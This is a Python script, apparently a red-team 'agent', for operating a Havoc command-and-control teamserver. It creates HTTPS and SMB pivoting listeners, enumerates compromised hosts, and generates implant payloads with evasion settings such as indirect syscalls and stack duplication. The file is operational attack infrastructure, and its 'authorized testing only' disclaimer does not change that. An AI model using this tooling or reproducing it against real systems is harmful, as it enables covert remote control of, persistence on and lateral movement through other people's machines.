#!/usr/bin/env python3
"""Havoc C2 Infrastructure Builder Agent - Manages Havoc C2 framework deployment and listener setup.

# For authorized penetration testing and lab environments only.
"""

import json
import logging
import argparse
import subprocess
from datetime import datetime

import requests

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

HAVOC_DEFAULT_PORT = 40056


def havoc_api_request(teamserver, endpoint, token, method="GET", data=None):
    """Make authenticated request to Havoc teamserver API."""
    url = f"https://{teamserver}/api/{endpoint}"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    try:
        if method == "GET":
            resp = requests.get(url, headers=headers, timeout=15, verify=False)
        else:
            resp = requests.post(url, headers=headers, json=data or {}, timeout=15, verify=False)
        resp.raise_for_status()
        return resp.json()
    except requests.RequestException as e:
        logger.error("Havoc API request failed: %s", e)
        return {"error": str(e)}


def list_listeners(teamserver, token):
    """List active listeners on the teamserver."""
    data = havoc_api_request(teamserver, "listeners", token)
    listeners = data.get("listeners", [])
    logger.info("Found %d active listeners", len(listeners))
    return listeners


def create_https_listener(teamserver, token, name, bind_addr, bind_port, hosts, secure=True):
    """Create an HTTPS listener."""
    config = {
        "name": name,
        "protocol": "Https",
        "host": bind_addr,
        "port": bind_port,
        "hosts": hosts,
        "secure": secure,
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "headers": ["Content-Type: application/json", "X-Forwarded-For: 127.0.0.1"],
    }
    result = havoc_api_request(teamserver, "listeners", token, method="POST", data=config)
    logger.info("Created HTTPS listener '%s' on %s:%d", name, bind_addr, bind_port)
    return result


def create_smb_listener(teamserver, token, name, pipe_name):
    """Create an SMB named pipe listener for pivoting."""
    config = {"name": name, "protocol": "Smb", "pipe_name": pipe_name}
    result = havoc_api_request(teamserver, "listeners", token, method="POST", data=config)
    logger.info("Created SMB listener '%s' on pipe %s", name, pipe_name)
    return result


def list_agents(teamserver, token):
    """List connected agents (demons)."""
    data = havoc_api_request(teamserver, "agents", token)
    agents = data.get("agents", [])
    logger.info("Found %d connected agents", len(agents))
    return [{"id": a.get("agent_id"), "hostname": a.get("hostname"), "username": a.get("username"),
             "os": a.get("os"), "process": a.get("process_name"), "pid": a.get("pid"),
             "last_callback": a.get("last_callback"), "sleep": a.get("sleep")} for a in agents]


def generate_payload(teamserver, token, listener_name, payload_type="exe", arch="x64"):
    """Generate a Havoc demon payload."""
    config = {
        "listener": listener_name,
        "arch": arch,
        "format": payload_type,
        "config": {
            "sleep": 5,
            "jitter": 20,
            "indirect_syscalls": True,
            "stack_duplication": True,
            "sleep_technique": "WaitForSingleObjectEx",
        },
    }
    result = havoc_api_request(teamserver, "payloads/generate", token, method="POST", data=config)
    logger.info("Generated %s payload for listener '%s'", payload_type, listener_name)
    return result


def assess_infrastructure(listeners, agents):
    """Assess C2 infrastructure health and coverage."""
    assessment = {
        "listener_count": len(listeners),
        "agent_count": len(agents),
        "protocols_in_use": list(set(l.get("protocol", "unknown") for l in listeners)),
        "unique_hosts": list(set(a.get("hostname", "unknown") for a in agents)),
        "stale_agents": [],
        "recommendations": [],
    }
    for agent in agents:
        sleep_val = agent.get("sleep", 0)
        if sleep_val > 60:
            assessment["stale_agents"].append(agent.get("id"))
    if not any(l.get("protocol") == "Smb" for l in listeners):
        assessment["recommendations"].append("Add SMB listener for internal pivoting")
    if len(listeners) < 2:
        assessment["recommendations"].append("Add redundant listeners for resilience")
    if not agents:
        assessment["recommendations"].append("No active agents - deploy payloads")
    return assessment


def generate_report(listeners, agents, assessment):
    """Generate C2 infrastructure report."""
    report = {
        "timestamp": datetime.utcnow().isoformat(),
        "disclaimer": "For authorized penetration testing and lab environments only",
        "listeners": listeners,
        "agents": agents,
        "infrastructure_assessment": assessment,
    }
    print(f"C2 REPORT: {len(listeners)} listeners, {len(agents)} agents, "
          f"{len(assessment.get('recommendations', []))} recommendations")
    return report


def main():
    parser = argparse.ArgumentParser(description="Havoc C2 Infrastructure Builder (authorized testing only)")
    parser.add_argument("--teamserver", required=True, help="Teamserver address (host:port)")
    parser.add_argument("--token", required=True, help="API authentication token")
    parser.add_argument("--action", choices=["status", "create-listener", "generate-payload", "full-report"],
                        default="full-report")
    parser.add_argument("--listener-name", default="https-primary")
    parser.add_argument("--bind-port", type=int, default=443)
    parser.add_argument("--output", default="havoc_c2_report.json")
    args = parser.parse_args()

    listeners = list_listeners(args.teamserver, args.token)
    agents = list_agents(args.teamserver, args.token)
    assessment = assess_infrastructure(listeners, agents)
    report = generate_report(listeners, agents, assessment)
    with open(args.output, "w") as f:
        json.dump(report, f, indent=2)
    logger.info("Report saved to %s", args.output)


if __name__ == "__main__":
    main()
